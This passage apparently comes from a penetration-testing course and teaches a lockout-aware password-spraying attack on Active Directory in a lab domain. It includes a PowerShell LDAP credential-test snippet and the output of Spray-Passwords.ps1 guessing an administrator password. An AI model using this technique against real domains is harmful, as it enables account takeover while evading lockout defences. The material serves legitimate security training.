In the previous section, we have looked at how service accounts may be attacked by abusing the features of the Kerberos protocol, but Active Directory can also provide us with information that may lead to a more advanced password guessing technique against user accounts.

When performing a brute-force or wordlist authentication attack, we must be aware of account lockouts since too many failed logins may block the account for further attacks and possibly alert system administrators.

In this section, we will use LDAP and ADSI to perform a "low and slow" password attack against AD users without triggering an account lockout.

First, let's take a look at the domain's account policy with net accounts:

```
PS C:\Users\Offsec.corp> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

There's a lot of great information here, but let's first focus on "Lockout threshold", which indicates a limit of five login attempts before lockout. This means that we can safely attempt four logins without triggering a lockout. This doesn't sound like much, but consider the _Lockout observation window_, which indicates that after thirty minutes after the last failed login, we are able to make another attempt.

With these settings, we could attempt one hundred and ninety-two logins in a twenty-four-hour period against every domain user without triggering a lockout, assuming the actual users don't fail a login attempt.

An attack like this would allow us to compile a short list of very commonly used passwords and use it against a massive amount of users, which in practice, reveals quite a few weak account passwords in the organization.

Knowing this, let's implement this attack.

There are a number of ways to test an AD user login, but we can use our PowerShell script to demonstrate the basic components. In previous sections, we performed queries against the domain controller as the logged-in user. However, we can also make queries in the context of a different user by setting the _DirectoryEntry_ instance.

In previous examples, we used the _DirectoryEntry_ constructor without arguments, but we can provide three arguments including the LDAP path to the domain controller as well as the username and the password:

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
```

If the password for the user account is correct, the object creation will be successful as shown in Listing 37.

```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC01.corp.com/DC=corp,DC=com
```

If the password is invalid, no object will be created and we will receive an exception as shown below. Note the clear warning that the user name or password is incorrect.

```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect.
"
  + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemExce
  + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.Forma
```

In this manner, we can create a PowerShell script that enumerates all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_.

An existing implementation of this attack called Spray-Passwords.ps1 is located in the C:\\Tools\\active_directory folder of the Windows 10 client.

The -Pass option allows us to set a single password to test, or we can submit a wordlist file with _-File_. We can also test admin accounts with the addition of the -Admin flag.

```
PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'Administrator' = 'Qwerty09!'
Guessed password for user: 'offsec' = 'Qwerty09!'
Guessed password for user: 'adam' = 'Qwerty09!'
Guessed password for user: 'iis_service' = 'Qwerty09!'
Guessed password for user: 'sql_service' = 'Qwerty09!'
Stopping bruteforce now....
Users guessed are:
 'Administrator' with password: 'Qwerty09!'
 'offsec' with password: 'Qwerty09!'
 'adam' with password: 'Qwerty09!'
 'iis_service' with password: 'Qwerty09!'
 'sql_service' with password: 'Qwerty09!'
```

This trivial example produces quick results but more often than not, we will need to use a wordlist with good password candidates.

We have now uncovered ways of obtaining credentials for both user and service accounts when attacking Active Directory and its authentication protocols. Next, we can start leveraging this to compromise additional machines in the domain, ideally those with high-value logged-in users.